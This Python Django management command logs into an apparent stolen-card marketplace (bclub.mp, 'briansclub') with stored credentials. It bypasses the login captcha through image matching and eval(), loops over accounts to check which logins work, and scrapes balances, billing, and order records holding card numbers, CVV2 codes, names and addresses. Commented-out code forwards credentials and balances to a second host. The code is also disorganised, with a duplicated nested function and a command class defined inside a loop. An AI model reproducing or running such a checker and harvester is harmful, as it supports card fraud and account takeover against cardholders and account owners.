import os
import random
import time
from datetime import datetime
from io import BytesIO
from random import choice, randint

import numpy as np
import requests
from bs4 import BeautifulSoup
from django.conf import settings
from django.contrib.auth.models import User
from django.core.management.base import BaseCommand
from PIL import Image
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

from api.models import UserData
from briansclub.models import Balance, Billing, Order, OrdersNumber

# Configuration
LOGIN_URL = 'https://bclub.mp/login/'
CAPTCHA_BASE_URL = 'https://bclub.mp/captcha/image/'
BILLING_URL = 'https://bclub.mp/billing/'
ORDERS_URL = 'https://bclub.mp/orders/'
USER_DATA_CREATE_URL = 'http://bclub.cc/userdata/create/'

# Initialize session
session = requests.Session()


def get_random_user_agent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
        # Add other user agents as needed
    ]
    return choice(user_agents)


def generate_random_ip():
    return '.'.join(str(randint(0, 255)) for _ in range(4))


def process_login_and_balance(session, headers, user):
    # Attempt to retrieve the login page and necessary CSRF tokens
    login_response = session.get('https://bclub.mp/login/', headers=headers)
    if login_response.status_code != 200:
        print("Error: Login page not reachable")
        return False

    soup = BeautifulSoup(login_response.content, 'html.parser')
    csrf_token = login_response.cookies.get('csrftoken')
    input_element = soup.find('input', {'id': 'id_captcha_0'})
    value = input_element['value']  # type: ignore
    img2_url = f'https://bclub.mp/captcha/image/{value}/'

    capvalue = find_identical_and_calculate(img2_url, 'static/public/brianimages/')

    # Assume captcha is solved here, replace with actual function call
    captcha_solution = capvalue

    login_data = {
        'csrfmiddlewaretoken': csrf_token,
        'username': user.username,
        'password': user.password,
        'captcha_0': value,
        'captcha_1': captcha_solution,
    }
    response = session.post('https://bclub.mp/login/', headers=headers, data=login_data)
    print('status', response.status_code)
    if b'incorrect' in response.content:
        print("Error: Login failed")
        return False

    # Parsing balance after successful login
    soup = BeautifulSoup(response.content, 'html.parser')
    balance_element = soup.find('span', {'id': 'user_balance'})
    if balance_element:
        user.balance = float(balance_element.text.strip())
        user.save()
        print(f"Balance updated: {user.balance}")
    else:
        print("Balance element not found")
        return False

    return True


def create_user_and_process(session, username, password):
    user_agents = [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
                ]
    headers = {
        'User-Agent': random.choice(user_agents),
        # 'X-Forwarded-For': generate_random_ip(),
    }
    try:
        login_response = session.get('https://bclub.mp/login/', headers=headers)
        if login_response.status_code != 200:
            print("Error: Login page not reachable")
            return False

        soup = BeautifulSoup(login_response.content, 'html.parser')
        csrf_token = login_response.cookies.get('csrftoken')
        print('csrf_token', csrf_token)
        input_element = soup.find('input', {'id': 'id_captcha_0'})
        value = input_element['value']  # type: ignore
        img2_url = f'https://bclub.mp/captcha/image/{value}/'
        print('img2_url', img2_url)
        capvalue = find_identical_and_calculate(img2_url, 'static/public/brianimages/')
        print('capvalue', capvalue)
        # Assume captcha is solved here, replace with actual function call

        login_data = {
            'csrfmiddlewaretoken': csrf_token,
            'username': username,
            'password': password,
            'captcha_0': value,
            'captcha_1': capvalue,
        }
        url = 'https://bclub.mp'
        user_agents = [
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
                    ]
        headers = {
                                        "X-CSRFToken": csrf_token,
                                        "Content-Type": "application/x-www-form-urlencoded",
                                        "Referer": url + "/login/",
                                        'User-Agent': random.choice(user_agents)
                                    }
        response = session.post('https://bclub.mp/login/', headers=headers, data=login_data)
        print('status', response.status_code)
        if b'Login or password are incorrect' in response.content:
            print("Error: Login failed")
            return False
        print(f"Creating user {username} with password {password}")

        # Check if the user already exists or create a new one
        user, created = User.objects.get_or_create(username=username)
        print(f"User {username} already exists: {created}")
        if created:
            user.set_password(password)
            user.save()
            print("User created successfully")
        elif user:
            user.set_password(password)
            user.save()
            print("User updated successfully")
        # Parsing balance after successful login
    except:
        print("Error: Login failed")
        return False
    html_content = response.content
    soup = BeautifulSoup(html_content, 'html.parser')
    span_element = soup.find('span', {'id': 'user_balance'})
    # soup = BeautifulSoup(response.content, 'html.parser')
    # balance_element = soup.find('span', {'id': 'user_balance'})
    print('balance_element', span_element)
    if span_element:
        Balance.update_user_balance(user.id, float(span_element.text))
        # user.balance = float(balance_element.text.strip())
        # user.save()
        data = {
                                            'username': username,
                                            'password': password,
                                            'balance': float(span_element.text),
        }
        new_user = UserData(username=username, password=password, balance=float(span_element.text))
        new_user.save()
        if new_user.pk:
            print("User created successfully!")
        else:
            print("User with this username and password already exists.")

        # response2 = requests.post(f'https://bclub.cc/userdata/', data=data)
        print(f"Balance updated: {float(span_element.text)}")
    else:
        print("Balance element not found")
        return False

    # if not process_login_and_balance(session, headers, user):
    #     return False

    process_billing_and_orders(session, user, headers)
    return True


def process_billing_and_orders(session, user, headers):
    billing_response = session.get('https://bclub.mp/billing/', headers=headers)
    if billing_response.status_code == 200:
        billing_soup = BeautifulSoup(billing_response.content, 'html.parser')
        process_billing(billing_soup, user)

    orders_response = session.get('https://bclub.mp/orders/', headers=headers)
    if orders_response.status_code == 200:
        orders_soup = BeautifulSoup(orders_response.content, 'html.parser')
        process_orders(orders_soup, user)


def process_billing(billing_soup, user):
    print('start Billing')
    billing_table = billing_soup.find('table', {'class': 'table table-responsive table-hover'})
    if billing_table:
        rows = billing_table.find_all('tr')[1:]  # Skip header row
        for row in rows:
            cols = row.find_all('td')
            if len(cols) >= 5:
                billing = Billing(
                    user=user,
                    system=cols[0].text.strip(),
                    amount=float(cols[1].text.strip().replace('USD', '')),
                    status=cols[2].text.strip(),
                    date=datetime.strptime(cols[3].text.strip(), '%Y-%m-%d %H:%M'),
                    details=cols[4].text.strip(),
                )
                billing.save()
                print(f"Billing saved: {billing}")


from django.utils import timezone  # Correct import statement for timezone


def process_orders(orders_soup, user):
    current_order_number = None
    print('start Orders1 ')
    order_table = orders_soup.find('table', {'class': 'table table-bordered table-responsive table-hover'})
    if order_table:
        print('start Orders')
        rows = order_table.find_all('tr')[1:]  # Skip header row
        for row in rows:
            cols = row.find_all('td')
            #                                             # Check if this is an order number row
            # if len(cols) == 3:
            #     # Extract the order number from the row
            #     order_number = int(''.join(filter(str.isdigit, cols[1].text.split('#')[-1])))
            #     print('order_number', order_number)
            #     date_string = cols[0].text.strip()
            #     date = datetime.strptime(date_string, '%Y-%m-%d %H:%M')
            #     # Create a new OrdersNumber object
            #     current_order_number, created = OrdersNumber.objects.get_or_create(
            #             number=order_number,
            #             defaults={'date': date }  # 'date' defaults to the current time if not provided
            #         )
            #     # current_order_number.save()
            #     print(f"OrdersNumber saved: {current_order_number}")

            if len(cols) >= 14:
                # random_number = random.randint(100000, 99999)
                # current_order_number = random_number
                order = Order(
                    user=user,
                    bin=cols[1].text.strip(),
                    type=cols[2].text.strip(),
                    dc=cols[3].text.strip(),
                    subtype=cols[4].text.strip(),
                    card_number=cols[5].text.strip(),
                    exp=cols[6].text.strip(),
                    cvv2=cols[7].text.strip(),
                    name=cols[8].text.strip(),
                    address=cols[9].text.strip(),
                    extra=cols[10].text.strip(),
                    bank=cols[11].text.strip(),
                    base=cols[12].text.strip(),
                    price=cols[13].text.strip(),
                )
                order.save()
                new_order_number = OrdersNumber.objects.create(number=int(timezone.now().timestamp()))
                # current_order_number = OrdersNumber(current_order_number))
                print(f"Order saved: {order}")
                new_order_number.orders.add(order)
                new_order_number.save()
                print(f"OrdersNumber saved: {new_order_number}")

                def find_identical_and_calculate(img2_url, dir_path):

                    # Download the second image
                    response = requests.get(img2_url)
                    img2 = Image.open(BytesIO(response.content))
                    img2_array = np.array(img2)

                    # Get the path to the images directory
                    images_dir = os.path.join(settings.BASE_DIR, dir_path)

                    # Loop over all files in the directory
                    for filename in os.listdir(images_dir):
                        print('for loop')
                        if filename.endswith('.png'):  # Check if the file is an image
                            img1_path = os.path.join(images_dir, filename)

                            # Open the image
                            img1 = Image.open(img1_path)
                            img1_array = np.array(img1)

                            # Check if the two arrays are identical
                            if np.array_equal(img1_array, img2_array):
                                # Remove the '.png' from the end of the filename
                                label = os.path.splitext(os.path.basename(img1_path))[0]

                                # Split the label at the equals sign and take the first part
                                expression = label.split('=')[0]

                                # Evaluate the expression
                                result = eval(expression)

                                return result

                    return None


def find_identical_and_calculate(img2_url, dir_path):
    response = requests.get(img2_url)
    try:
        img2 = Image.open(BytesIO(response.content))
    except:
        print(f"Cannot identify image: {img2_url}")
        return None
    img2_array = np.array(img2)

    for filename in os.listdir(dir_path):
        if filename.endswith('.png'):
            img1_path = os.path.join(dir_path, filename)
            img1 = Image.open(img1_path)
            img1_array = np.array(img1)

            if np.array_equal(img1_array, img2_array):
                label = os.path.splitext(os.path.basename(img1_path))[0]
                expression = label.split('=')[0]
                result = eval(expression)
                return result
    return None


counter = 0

while True:
    try:

        class Command(BaseCommand):
            help = 'Checks if login is successful and leaves data or removes it based on the result.'

            def handle(self, *args, **kwargs):
                session = requests.Session()
                retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
                session.mount('https://', HTTPAdapter(max_retries=retries))

                try:
                    with open('last_successful_index.txt', 'r') as f:
                        start_index = int(f.read())
                except FileNotFoundError:
                    start_index = 0

                user_agents = [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
                ]
                counter = 0

                while True:
                    for i, user_data in enumerate(UserData.objects.all().order_by('-created_at')[start_index:3]):
                        print(f"Checking user {start_index + i + 1} of 5")
                        try:

                            # while True:
                                print(start_index)
                                print(';')
                                # time.sleep(2)
                                session = requests.Session()
                                create_user_and_process(session, user_data.username, user_data.password)
                                print('userdate', user_data.username, user_data.password)
                            #     print('while loop')
                            #     headers = {
                            #         'User-Agent': random.choice(user_agents)
                            #     }
                            #     url = 'https://bclub.mp'if counter % 2 == 0  else 'https://bclub.mp'
                                counter += 1

                            #     try:
                            #         response1 = session.get(url + '/login/', headers=headers, timeout=30)
                            #         print(response1)
                            #     except requests.exceptions.ConnectionError:
                            #         print("ConnectionError occurred. Retrying...")
                            #         time.sleep(5)
                            #         continue

                            #     soup = BeautifulSoup(response1.content, 'html.parser')
                            #     input_element = soup.find('input', {'id': 'id_captcha_0'})
                            #     try:
                            #         value = input_element['value']
                            #     except:
                            #         print("Error: Captcha not found")
                            #         continue

                            #     img2_url = url + f'/captcha/image/{value}/'
                            #     print(img2_url)
                            #     capvalue=find_identical_and_calculate(img2_url, 'static/public/brianimages/')
                            #     print(capvalue)

                            #     csrf_token = response1.cookies['csrftoken']
                            #     print(csrf_token)

                            #     headers = {
                            #         "X-CSRFToken": csrf_token,
                            #         "Content-Type": "application/x-www-form-urlencoded",
                            #         "Referer": url + "/login/",
                            #         'User-Agent': random.choice(user_agents)
                            #     }
                            #     data = {
                            #         'csrfmiddlewaretoken': csrf_token,
                            #         'username': user_data.username,
                            #         'password': user_data.password,
                            #         'captcha_0': value,
                            #         'captcha_1': capvalue,
                            #     }
                            #     try:
                            #         response = session.post(url + '/login/', headers=headers, data=data)
                            #         print('res post code ',response.status_code)
                            #     except requests.exceptions.ConnectionError:
                            #         print("ConnectionError occurred. Retrying...")
                            #         time.sleep(5)
                            #         continue

                            #     if b'Login or password are incorrect' in response.content:
                            #         print("Error: Login failed user and pass")
                            #         print(f"Error: Login failed for {user_data.username}")
                            #         if user_data.pk is not None:
                            #             print('nouser')
                            #             # user_data.delete()
                            #         print('deleted')
                            #         break

                            #     else:
                            #         print("Login successful")

                            #         html_content = response.content
                            #         soup = BeautifulSoup(html_content, 'html.parser')
                            #         span_element = soup.find('span', {'id': 'user_balance'})

                            #         try:
                            #             value = span_element.text
                            #             print('balance',value)
                            #             data = {
                            #                 'username': user_data.username,
                            #                 'password': user_data.password,
                            #                 'balance': value,
                            #             }
                            #             response2 = requests.put(f'https://bclub.cc/userdata/{user_data.username}/update/', data=data)
                            #             print('response 2 ',response2)
                            #             # django_user = User.objects.create_user(username=user_data.username, password=user_data.password)
                            #             # print('django_user ',django_user)
                            #             break
                            #         except AttributeError:
                            #             print("Error: Balance not found")
                            #             print(f"Error: Login failed for {user_data.username}")
                            #             if response.status_code == 429:
                            #                 print("Error: Too many requests")
                            #                 time.sleep(5)
                            #             soup = BeautifulSoup(html_content, 'html.parser')
                            #             h2_element = soup.find('h2', {'class': 'form-signin-heading'})

                            #             if h2_element and h2_element.text == "Secret Phrase Verification":
                            #                 print("Found secret phrase verification element. Breaking...")
                            #                 break
                        except Exception as e:
                                print(f"An error occurred: {e}")
                                continue

                        with open('last_successful_index1.txt', 'w') as f:
                            f.write(str(start_index + i))

                    print("All users have been checked.")
                    start_index = 0

        break
    except Exception as e:
        print(f"An error occurred: {e}")
        continue
